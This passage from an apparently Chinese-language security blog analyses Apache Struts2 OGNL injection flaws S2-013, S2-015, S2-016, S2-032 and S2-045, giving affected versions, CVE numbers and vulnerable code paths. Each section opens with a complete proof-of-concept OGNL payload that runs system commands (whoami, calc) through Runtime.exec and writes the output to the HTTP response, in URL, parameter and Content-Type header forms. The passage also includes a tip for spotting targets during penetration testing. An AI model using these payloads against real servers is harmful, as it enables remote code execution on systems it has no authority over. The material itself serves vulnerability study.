</span></span></code></pre></td></tr></table></div></div><p>这里看到，while循环外面其实还有一层循环，这个循环的层数取决于 <code>openChars</code> 的元素个数，这里其元素为 <code>'$', '%'</code> ，个数为2，所以能触发二次解析，且第二次解析的表达式必须为 <code>%{xxxx}</code> 格式。</p><h2 id=s2-013>S2-013</h2><p>影响版本：Struts 2.0.0 - Struts 2.3.14.1</p><p>CVE编号：CVE-2013-1966</p><p>POC如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>a</span><span class=o>=</span><span class=n>$</span><span class=o>{</span><span class=err>#</span><span class=n>_memberAccess</span><span class=o>[</span><span class=s>&#34;allowStaticMethodAccess&#34;</span><span class=o>]=</span><span class=kc>true</span><span class=o>,</span><span class=err>#</span><span class=n>a</span><span class=o>=</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=o>().</span><span class=na>exec</span><span class=o>(</span><span class=err>&#39;</span><span class=n>whoami</span><span class=err>&#39;</span><span class=o>).</span><span class=na>getInputStream</span><span class=o>(),</span><span class=err>#</span><span class=n>b</span><span class=o>=</span><span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>InputStreamReader</span><span class=o>(</span><span class=err>#</span><span class=n>a</span><span class=o>),</span><span class=err>#</span><span class=n>c</span><span class=o>=</span><span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>BufferedReader</span><span class=o>(</span><span class=err>#</span><span class=n>b</span><span class=o>),</span><span class=err>#</span><span class=n>d</span><span class=o>=</span><span class=k>new</span> <span class=kt>char</span><span class=o>[</span><span class=n>50000</span><span class=o>],</span><span class=err>#</span><span class=n>c</span><span class=o>.</span><span class=na>read</span><span class=o>(</span><span class=err>#</span><span class=n>d</span><span class=o>),</span><span class=err>#</span><span class=n>out</span><span class=o>=</span><span class=nd>@org.apache.struts2.ServletActionContext@getResponse</span><span class=o>().</span><span class=na>getWriter</span><span class=o>(),</span><span class=err>#</span><span class=n>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=err>&#39;</span><span class=n>result</span><span class=o>=</span><span class=err>&#39;</span><span class=o>+</span><span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>String</span><span class=o>(</span><span class=err>#</span><span class=n>d</span><span class=o>)),</span><span class=err>#</span><span class=n>out</span><span class=o>.</span><span class=na>close</span><span class=o>()}</span>
</span></span></code></pre></td></tr></table></div></div><p>这个漏洞，需要启用 <code>&lt;s:a></code> 或者 <code>&lt;s:url></code> 标签中的 <code>includeParams</code> 属性，且这个属性的值必须为get或者all。</p><p>当<code>includeParams=all</code>的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行<code>OGNL</code>渲染，造成任意命令执行漏洞。一个例子如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>Try add some parameters in URL<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;&lt;</span><span class=nt>s:a</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;link1&#34;</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;link&#34;</span> <span class=na>includeParams</span><span class=o>=</span><span class=s>&#34;all&#34;</span><span class=p>&gt;</span>&#34;s:a&#34; tag<span class=p>&lt;/</span><span class=nt>s:a</span><span class=p>&gt;&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;&lt;</span><span class=nt>s:url</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;link2&#34;</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;link&#34;</span> <span class=na>includeParams</span><span class=o>=</span><span class=s>&#34;all&#34;</span><span class=p>&gt;</span>&#34;s:url&#34; tag<span class=p>&lt;/</span><span class=nt>s:url</span><span class=p>&gt;&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>漏洞发生在 <code>org.apache.struts2.views.util.UrlHelper#translateVariable(String)</code> 中：</p><p><img src=/media/image-20210816151304731.png alt=image-20210816151304731></p><p>后续就是底层Ognl表达式的解析了，前面已经跟过，此处不再累赘。</p><h2 id=s2-015>S2-015</h2><p>影响版本：Struts 2.0.0 - Struts 2.3.14.2</p><p>CVE编号：CVE-2013-2135 CVE-2013-2134</p><p>POC如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=c1>// POC1：如下POC贴在URL中
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>/</span><span class=n>$</span><span class=o>{</span><span class=err>#</span><span class=n>context</span><span class=o>[</span><span class=err>&#39;</span><span class=n>xwork</span><span class=o>.</span><span class=na>MethodAccessor</span><span class=o>.</span><span class=na>denyMethodExecution</span><span class=err>&#39;</span><span class=o>]=</span><span class=kc>false</span><span class=o>,</span><span class=err>#</span><span class=n>m</span><span class=o>=</span><span class=err>#</span><span class=n>_memberAccess</span><span class=o>.</span><span class=na>getClass</span><span class=o>().</span><span class=na>getDeclaredField</span><span class=o>(</span><span class=err>&#39;</span><span class=n>allowStaticMethodAccess</span><span class=err>&#39;</span><span class=o>),</span><span class=err>#</span><span class=n>m</span><span class=o>.</span><span class=na>setAccessible</span><span class=o>(</span><span class=kc>true</span><span class=o>),</span><span class=err>#</span><span class=n>m</span><span class=o>.</span><span class=na>set</span><span class=o>(</span><span class=err>#</span><span class=n>_memberAccess</span><span class=o>,</span><span class=kc>true</span><span class=o>),</span><span class=err>#</span><span class=n>q</span><span class=o>=</span><span class=nd>@org.apache.commons.io.IOUtils@toString</span><span class=o>(</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=o>().</span><span class=na>exec</span><span class=o>(</span><span class=err>&#39;</span><span class=n>calc</span><span class=err>&#39;</span><span class=o>).</span><span class=na>getInputStream</span><span class=o>()),</span><span class=err>#</span><span class=n>q</span><span class=o>}.</span><span class=na>action</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// POC2：绕过S2-001的修复
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>your_param_name</span><span class=o>=%{</span><span class=err>#</span><span class=n>context</span><span class=o>[</span><span class=err>&#39;</span><span class=n>xwork</span><span class=o>.</span><span class=na>MethodAccessor</span><span class=o>.</span><span class=na>denyMethodExecution</span><span class=err>&#39;</span><span class=o>]=</span><span class=kc>false</span><span class=o>,</span><span class=err>#</span><span class=n>m</span><span class=o>=</span><span class=err>#</span><span class=n>_memberAccess</span><span class=o>.</span><span class=na>getClass</span><span class=o>().</span><span class=na>getDeclaredField</span><span class=o>(</span><span class=err>&#39;</span><span class=n>allowStaticMethodAccess</span><span class=err>&#39;</span><span class=o>),</span><span class=err>#</span><span class=n>m</span><span class=o>.</span><span class=na>setAccessible</span><span class=o>(</span><span class=kc>true</span><span class=o>),</span><span class=err>#</span><span class=n>m</span><span class=o>.</span><span class=na>set</span><span class=o>(</span><span class=err>#</span><span class=n>_memberAccess</span><span class=o>,</span><span class=kc>true</span><span class=o>),</span><span class=err>#</span><span class=n>q</span><span class=o>=</span><span class=nd>@org.apache.commons.io.IOUtils@toString</span><span class=o>(</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=o>().</span><span class=na>exec</span><span class=o>(</span><span class=err>&#39;</span><span class=n>whoami</span><span class=err>&#39;</span><span class=o>).</span><span class=na>getInputStream</span><span class=o>()),</span><span class=err>#</span><span class=n>q</span><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>对于POC1，主要是存在如下场景适用：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=o>&lt;</span><span class=n>action</span> <span class=n>name</span><span class=o>=</span><span class=s>&#34;*&#34;</span> <span class=n>class</span><span class=o>=</span><span class=s>&#34;com.demo.action.PageAction&#34;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>   <span class=o>&lt;</span><span class=n>result</span><span class=o>&gt;/{</span><span class=n>1</span><span class=o>}.</span><span class=na>jsp</span><span class=o>&lt;/</span><span class=n>result</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;/</span><span class=n>action</span><span class=o>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>其中action的name为 <code>*</code> 符号，在 <code>org.apache.struts2.dispatcher.StrutsResultSupport#execute(ActionInvocation)</code> 中会对当前请求路径进行处理：</p><p><img src=/media/image-20210816153036623.png alt=image-20210816153036623></p><p>跟进 <code>this.conditionalParse(this.location, invocation)</code> ：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>protected</span> <span class=n>String</span> <span class=nf>conditionalParse</span><span class=o>(</span><span class=n>String</span> <span class=n>param</span><span class=o>,</span> <span class=n>ActionInvocation</span> <span class=n>invocation</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>this</span><span class=o>.</span><span class=na>parse</span> <span class=o>&amp;&amp;</span> <span class=n>param</span> <span class=o>!=</span> <span class=kc>null</span> <span class=o>&amp;&amp;</span> <span class=n>invocation</span> <span class=o>!=</span> <span class=kc>null</span> <span class=o>?</span> <span class=n>TextParseUtil</span><span class=o>.</span><span class=na>translateVariables</span><span class=o>(</span><span class=n>param</span><span class=o>,</span> <span class=n>invocation</span><span class=o>.</span><span class=na>getStack</span><span class=o>(),</span> <span class=k>new</span> <span class=n>ParsedValueEvaluator</span><span class=o>()</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=kd>public</span> <span class=n>Object</span> <span class=nf>evaluate</span><span class=o>(</span><span class=n>String</span> <span class=n>parsedValue</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=o>(</span><span class=n>StrutsResultSupport</span><span class=o>.</span><span class=na>this</span><span class=o>.</span><span class=na>encode</span> <span class=o>&amp;&amp;</span> <span class=n>parsedValue</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=k>try</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=n>URLEncoder</span><span class=o>.</span><span class=na>encode</span><span class=o>(</span><span class=n>parsedValue</span><span class=o>,</span> <span class=s>&#34;UTF-8&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>UnsupportedEncodingException</span> <span class=n>var3</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=o>(</span><span class=n>StrutsResultSupport</span><span class=o>.</span><span class=na>LOG</span><span class=o>.</span><span class=na>isWarnEnabled</span><span class=o>())</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                        <span class=n>StrutsResultSupport</span><span class=o>.</span><span class=na>LOG</span><span class=o>.</span><span class=na>warn</span><span class=o>(</span><span class=s>&#34;error while trying to encode [&#34;</span> <span class=o>+</span> <span class=n>parsedValue</span> <span class=o>+</span> <span class=s>&#34;]&#34;</span><span class=o>,</span> <span class=n>var3</span><span class=o>,</span> <span class=k>new</span> <span class=n>String</span><span class=o>[</span><span class=n>0</span><span class=o>]);</span>
</span></span><span class=line><span class=cl>                    <span class=o>}</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>parsedValue</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>})</span> <span class=o>:</span> <span class=n>param</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>可以看到第一行就是调用 <code>TextParseUtil#translateVariables()</code> 方法，这个方法底层会进行Ognl表达式解析，由此造成Ognl表达式注入。调用栈如下：</p><p><img src=/media/image-20210816153329556.png alt=image-20210816153329556></p><p>对于POC2，主要的适用场景如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=o>&lt;</span><span class=n>action</span> <span class=n>name</span><span class=o>=</span><span class=s>&#34;param&#34;</span> <span class=n>class</span><span class=o>=</span><span class=s>&#34;com.demo.action.ParamAction&#34;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=o>&lt;</span><span class=n>result</span> <span class=n>name</span><span class=o>=</span><span class=s>&#34;error&#34;</span><span class=o>&gt;</span><span class=n>$</span><span class=o>{</span><span class=n>message</span><span class=o>}&lt;/</span><span class=n>result</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=o>&lt;</span><span class=n>result</span> <span class=n>name</span><span class=o>=</span><span class=s>&#34;success&#34;</span> <span class=n>type</span><span class=o>=</span><span class=s>&#34;httpheader&#34;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=o>&lt;</span><span class=n>param</span> <span class=n>name</span><span class=o>=</span><span class=s>&#34;error&#34;</span><span class=o>&gt;</span><span class=n>305</span><span class=o>&lt;/</span><span class=n>param</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=o>&lt;</span><span class=n>param</span> <span class=n>name</span><span class=o>=</span><span class=s>&#34;headers.pinger&#34;</span><span class=o>&gt;</span><span class=n>$</span><span class=o>{</span><span class=n>message</span><span class=o>}&lt;/</span><span class=n>param</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=o>&lt;/</span><span class=n>result</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;/</span><span class=n>action</span><span class=o>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>这个漏洞没啥好说的，至于为啥会解析 <code>${message}</code> 的值，因为攻击者传递的 <code>${message}</code> 值为：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=o>%{</span><span class=err>#</span><span class=n>context</span><span class=o>[</span><span class=err>&#39;</span><span class=n>xwork</span><span class=o>.</span><span class=na>MethodAccessor</span><span class=o>.</span><span class=na>denyMethodExecution</span><span class=err>&#39;</span><span class=o>]=</span><span class=kc>false</span><span class=o>,</span><span class=err>#</span><span class=n>m</span><span class=o>=</span><span class=err>#</span><span class=n>_memberAccess</span><span class=o>.</span><span class=na>getClass</span><span class=o>().</span><span class=na>getDeclaredField</span><span class=o>(</span><span class=err>&#39;</span><span class=n>allowStaticMethodAccess</span><span class=err>&#39;</span><span class=o>),</span><span class=err>#</span><span class=n>m</span><span class=o>.</span><span class=na>setAccessible</span><span class=o>(</span><span class=kc>true</span><span class=o>),</span><span class=err>#</span><span class=n>m</span><span class=o>.</span><span class=na>set</span><span class=o>(</span><span class=err>#</span><span class=n>_memberAccess</span><span class=o>,</span><span class=kc>true</span><span class=o>),</span><span class=err>#</span><span class=n>q</span><span class=o>=</span><span class=nd>@org.apache.commons.io.IOUtils@toString</span><span class=o>(</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=o>().</span><span class=na>exec</span><span class=o>(</span><span class=err>&#39;</span><span class=n>calc</span><span class=err>&#39;</span><span class=o>).</span><span class=na>getInputStream</span><span class=o>()),</span><span class=err>#</span><span class=n>q</span><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>是一个 <code>%{xxxx}</code> 结构的表达式，前面在S2-012的末尾也说明过，在 <code>com.opensymphony.xwork2.util.TextParseUtil#translateVariables()</code> 中限制解析的层数最多为1层了，但是其实可以绕，如果二次解析的表达式为 <code>%{xxxx}</code> 格式，就会触发二次解析，从而RCE。</p><p>POC1 RCE证明：</p><p><img src=/media/image-20210816154403131.png alt=image-20210816154403131></p><p>POC2 RCE证明：</p><p><img src=/media/image-20210816154624713.png alt=image-20210816154624713></p><h2 id=s2-016>S2-016</h2><p>影响版本：Struts 2.0.0 - Struts 2.3.15</p><p>CVE编号：CVE-2013-2251</p><p>POC如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=o>?</span><span class=n>redirect</span><span class=o>:</span><span class=n>$</span><span class=o>{</span><span class=err>#</span><span class=n>context</span><span class=o>[</span><span class=s>&#34;xwork.MethodAccessor.denyMethodExecution&#34;</span><span class=o>]=</span><span class=kc>false</span><span class=o>,</span><span class=err>#</span><span class=n>f</span><span class=o>=</span><span class=err>#</span><span class=n>_memberAccess</span><span class=o>.</span><span class=na>getClass</span><span class=o>().</span><span class=na>getDeclaredField</span><span class=o>(</span><span class=s>&#34;allowStaticMethodAccess&#34;</span><span class=o>),</span><span class=err>#</span><span class=n>f</span><span class=o>.</span><span class=na>setAccessible</span><span class=o>(</span><span class=kc>true</span><span class=o>),</span><span class=err>#</span><span class=n>f</span><span class=o>.</span><span class=na>set</span><span class=o>(</span><span class=err>#</span><span class=n>_memberAccess</span><span class=o>,</span><span class=kc>true</span><span class=o>),</span><span class=err>#</span><span class=n>a</span><span class=o>=</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=o>().</span><span class=na>exec</span><span class=o>(</span><span class=s>&#34;calc&#34;</span><span class=o>).</span><span class=na>getInputStream</span><span class=o>(),</span><span class=err>#</span><span class=n>b</span><span class=o>=</span><span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>InputStreamReader</span><span class=o>(</span><span class=err>#</span><span class=n>a</span><span class=o>),</span><span class=err>#</span><span class=n>c</span><span class=o>=</span><span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>BufferedReader</span><span class=o>(</span><span class=err>#</span><span class=n>b</span><span class=o>),</span><span class=err>#</span><span class=n>d</span><span class=o>=</span><span class=k>new</span> <span class=kt>char</span><span class=o>[</span><span class=n>5000</span><span class=o>],</span><span class=err>#</span><span class=n>c</span><span class=o>.</span><span class=na>read</span><span class=o>(</span><span class=err>#</span><span class=n>d</span><span class=o>),</span><span class=err>#</span><span class=n>genxor</span><span class=o>=</span><span class=err>#</span><span class=n>context</span><span class=o>.</span><span class=na>get</span><span class=o>(</span><span class=s>&#34;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#34;</span><span class=o>).</span><span class=na>getWriter</span><span class=o>(),</span><span class=err>#</span><span class=n>genxor</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=err>#</span><span class=n>d</span><span class=o>),</span><span class=err>#</span><span class=n>genxor</span><span class=o>.</span><span class=na>flush</span><span class=o>(),</span><span class=err>#</span><span class=n>genxor</span><span class=o>.</span><span class=na>close</span><span class=o>()}</span>
</span></span></code></pre></td></tr></table></div></div><p>这个漏洞的产生原因是：在<code>struts2</code>中，<code>DefaultActionMapper</code>类支持以 <code>action:</code> 、 <code>redirect:</code> 、 <code>redirectAction:</code> 作为导航或是重定向前缀，但是这些前缀后面同时可以跟 <code>OGNL</code> 表达式，由于 <code>struts2</code> 没有对这些前缀做过滤，导致利用<code>OGNL</code>表达式调用<code>java</code>静态方法执行任意系统命令。</p><p>如下所示（ <code>org.apache.struts2.dispatcher.StrutsResultSupport#conditionalParse(String, ActionInvocation)</code> ）：</p><p><img src=/media/image-20210816160159675.png alt=image-20210816160159675></p><p>如果不带 <code>action:</code> 、 <code>redirect:</code> 、 <code>redirectAction:</code> 前缀，再次在 <code>org.apache.struts2.dispatcher.StrutsResultSupport#conditionalParse(String, ActionInvocation)</code> 打断点，发现不能携带Ognl表达式了：</p><p><img src=/media/image-20210816160431300.png alt=image-20210816160431300></p><p>RCE证明：</p><p><img src=/media/image-20210816160526664.png alt=image-20210816160526664></p><h2 id=s2-032>S2-032</h2><p>影响版本：Struts 2.0.0 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)</p><p>CVE编号：CVE-2016-3081</p><p>POC如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=o>?</span><span class=n>method</span><span class=o>:%</span><span class=n>23_memberAccess</span><span class=o>%</span><span class=n>3d</span><span class=nd>@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</span><span class=o>,%</span><span class=n>23res</span><span class=o>%</span><span class=n>3d</span><span class=o>%</span><span class=n>40org</span><span class=o>.</span><span class=na>apache</span><span class=o>.</span><span class=na>struts2</span><span class=o>.</span><span class=na>ServletActionContext</span><span class=o>%</span><span class=n>40getResponse</span><span class=o>(),%</span><span class=n>23res</span><span class=o>.</span><span class=na>setCharacterEncoding</span><span class=o>(%</span><span class=n>23parameters</span><span class=o>.</span><span class=na>encoding</span><span class=o>%</span><span class=n>5B0</span><span class=o>%</span><span class=n>5D</span><span class=o>),%</span><span class=n>23w</span><span class=o>%</span><span class=n>3d</span><span class=o>%</span><span class=n>23res</span><span class=o>.</span><span class=na>getWriter</span><span class=o>(),%</span><span class=n>23s</span><span class=o>%</span><span class=n>3dnew</span><span class=o>+</span><span class=n>java</span><span class=o>.</span><span class=na>util</span><span class=o>.</span><span class=na>Scanner</span><span class=o>(</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=o>().</span><span class=na>exec</span><span class=o>(%</span><span class=n>23parameters</span><span class=o>.</span><span class=na>cmd</span><span class=o>%</span><span class=n>5B0</span><span class=o>%</span><span class=n>5D</span><span class=o>).</span><span class=na>getInputStream</span><span class=o>()).</span><span class=na>useDelimiter</span><span class=o>(%</span><span class=n>23parameters</span><span class=o>.</span><span class=na>pp</span><span class=o>%</span><span class=n>5B0</span><span class=o>%</span><span class=n>5D</span><span class=o>),%</span><span class=n>23str</span><span class=o>%</span><span class=n>3d</span><span class=o>%</span><span class=n>23s</span><span class=o>.</span><span class=na>hasNext</span><span class=o>()%</span><span class=n>3f</span><span class=o>%</span><span class=n>23s</span><span class=o>.</span><span class=na>next</span><span class=o>()%</span><span class=n>3a</span><span class=o>%</span><span class=n>23parameters</span><span class=o>.</span><span class=na>ppp</span><span class=o>%</span><span class=n>5B0</span><span class=o>%</span><span class=n>5D</span><span class=o>,%</span><span class=n>23w</span><span class=o>.</span><span class=na>print</span><span class=o>(%</span><span class=n>23str</span><span class=o>),%</span><span class=n>23w</span><span class=o>.</span><span class=na>close</span><span class=o>(),</span><span class=n>1</span><span class=o>?%</span><span class=n>23xx</span><span class=o>:%</span><span class=n>23request</span><span class=o>.</span><span class=na>toString</span><span class=o>&amp;</span><span class=n>pp</span><span class=o>=%</span><span class=n>5C</span><span class=o>%</span><span class=n>5CA</span><span class=o>&amp;</span><span class=n>ppp</span><span class=o>=%</span><span class=n>20</span><span class=o>&amp;</span><span class=n>encoding</span><span class=o>=</span><span class=n>UTF</span><span class=o>-</span><span class=n>8</span><span class=o>&amp;</span><span class=n>cmd</span><span class=o>=</span><span class=n>calc</span>
</span></span></code></pre></td></tr></table></div></div><p>这个漏洞需要开启动态方法调用，才能支持method前缀：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;constant</span> <span class=na>name=</span><span class=s>&#34;struts.enable.DynamicMethodInvocation&#34;</span> <span class=na>value=</span><span class=s>&#34;true&#34;</span> <span class=nt>/&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>在 <code>org.apache.struts2.dispatcher.mapper.DefaultActionMapper#handleSpecialParameters(HttpServletRequest, ActionMapping)</code> 中将 <code>method:xxxxx</code> 的Ognl表达式部分添加到ActionMapping的method属性：</p><p><img src=/media/image-20210816170503578.png alt=image-20210816170503578></p><p>后续在 <code>com.opensymphony.xwork2.DefaultActionInvocation#invokeAction(Object, ActionConfig)</code> 取出并进行Ognl表达式解析：</p><p><img src=/media/image-20210816170730290.png alt=image-20210816170730290></p><p>RCE证明：</p><p><img src=/media/image-20210816162313949.png alt=image-20210816162313949></p><p><strong>如果在渗透过程中，发现类似： <code>?student!add.action</code> 的链接，那么靶机必然开了动态方法调用。</strong></p><h2 id=s2-045>S2-045</h2><p>影响版本：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10</p><p>CVE编号：CVE-2017-5638</p><p>POC如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>Content</span><span class=o>-</span><span class=n>Type</span><span class=o>:</span> <span class=o>%{(</span><span class=err>#</span><span class=n>nike</span><span class=o>=</span><span class=err>&#39;</span><span class=n>multipart</span><span class=o>/</span><span class=n>form</span><span class=o>-</span><span class=n>data</span><span class=err>&#39;</span><span class=o>).(</span><span class=err>#</span><span class=n>dm</span><span class=o>=</span><span class=nd>@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</span><span class=o>).(</span><span class=err>#</span><span class=n>_memberAccess</span><span class=o>?(</span><span class=err>#</span><span class=n>_memberAccess</span><span class=o>=</span><span class=err>#</span><span class=n>dm</span><span class=o>):((</span><span class=err>#</span><span class=n>container</span><span class=o>=</span><span class=err>#</span><span class=n>context</span><span class=o>[</span><span class=err>&#39;</span><span class=n>com</span><span class=o>.</span><span class=na>opensymphony</span><span class=o>.</span><span class=na>xwork2</span><span class=o>.</span><span class=na>ActionContext</span><span class=o>.</span><span class=na>container</span><span class=err>&#39;</span><span class=o>]).(</span><span class=err>#</span><span class=n>ognlUtil</span><span class=o>=</span><span class=err>#</span><span class=n>container</span><span class=o>.</span><span class=na>getInstance</span><span class=o>(</span><span class=nd>@com.opensymphony.xwork2.ognl.OgnlUtil@class</span><span class=o>)).(</span><span class=err>#</span><span class=n>ognlUtil</span><span class=o>.</span><span class=na>getExcludedPackageNames</span><span class=o>().</span><span class=na>clear</span><span class=o>()).(</span><span class=err>#</span><span class=n>ognlUtil</span><span class=o>.</span><span class=na>getExcludedClasses</span><span class=o>().</span><span class=na>clear</span><span class=o>()).(</span><span class=err>#</span><span class=n>context</span><span class=o>.</span><span class=na>setMemberAccess</span><span class=o>(</span><span class=err>#</span><span class=n>dm</span><span class=o>)))).(</span><span class=err>#</span><span class=n>cmd</span><span class=o>=</span><span class=err>&#39;</span><span class=n>calc</span><span class=err>&#39;</span><span class=o>).(</span><span class=err>#</span><span class=n>iswin</span><span class=o>=(</span><span class=nd>@java.lang.System@getProperty</span><span class=o>(</span><span class=err>&#39;</span><span class=n>os</span><span class=o>.</span><span class=na>name</span><span class=err>&#39;</span><span class=o>).</span><span class=na>toLowerCase</span><span class=o>().</span><span class=na>contains</span><span class=o>(</span><span class=err>&#39;</span><span class=n>win</span><span class=err>&#39;</span><span class=o>))).(</span><span class=err>#</span><span class=n>cmds</span><span class=o>=(</span><span class=err>#</span><span class=n>iswin</span><span class=o>?{</span><span class=err>&#39;</span><span class=n>cmd</span><span class=o>.</span><span class=na>exe</span><span class=sc>&#39;,&#39;</span><span class=o>/</span><span class=n>c</span><span class=err>&#39;</span><span class=o>,</span><span class=err>#</span><span class=n>cmd</span><span class=o>}:{</span><span class=err>&#39;</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span><span class=sc>&#39;,&#39;</span><span class=o>-</span><span class=n>c</span><span class=err>&#39;</span><span class=o>,</span><span class=err>#</span><span class=n>cmd</span><span class=o>})).(</span><span class=err>#</span><span class=n>p</span><span 